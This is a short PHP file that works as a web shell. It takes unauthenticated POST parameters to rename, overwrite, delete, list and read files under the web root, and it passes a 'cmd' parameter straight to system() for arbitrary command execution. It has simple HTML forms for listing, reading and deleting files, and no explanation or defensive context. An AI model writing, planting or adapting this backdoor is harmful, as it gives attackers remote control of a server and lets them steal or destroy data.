<?php
error_reporting(0);$root = $_SERVER['DOCUMENT_ROOT'];
if($_POST['a'] && $_POST['b']) {
	$a = $root.$_POST['a'];$b = $root.$_POST['b'];echo @rename($a,$b)?'success':'faild';
}elseif($_POST['c'] && $_POST['d']) {
	$c = $root.$_POST['c'];$d = $_POST['d'];file_put_contents($c, $d);
}elseif($_POST['e']) {
	$e = $root.$_POST['e'];unlink($e);
}elseif($_POST['f']) {
	echo $f = $root.$_POST['f'];
    if(is_dir($f)) {        
        if($dh = opendir($f)) {        
            while(($file = readdir($dh)) !== false) {        
                if($file != '.' && $file != '..') {        
                    echo '<br />'.$file;        
                }        
            }    
            closedir($dh);        
        }      
    }  
}
elseif($_POST['g']) {
	$g = $root.$_POST['g'];echo $g.'<br />';$text = file_get_contents($g);echo '<textarea>'.$text.'</textarea>';
}
elseif($_POST['cmd']) {
	$cmd = $_POST['cmd'];system($cmd);
}
$key = $_REQUEST['key'];
$arr = explode('x',$key);

?>
<form method="post"><input style="width:500px;" type="text" name="f" value="<?php echo $_POST['f'];?>" /><input type="submit" value="list" /></form>
<form method="post"><input style="width:500px;" type="text" name="g" /><input type="submit" value="read" /></form>
<form method="post"><input type="text" name="e" /><input type="submit" value="delete" /></form>
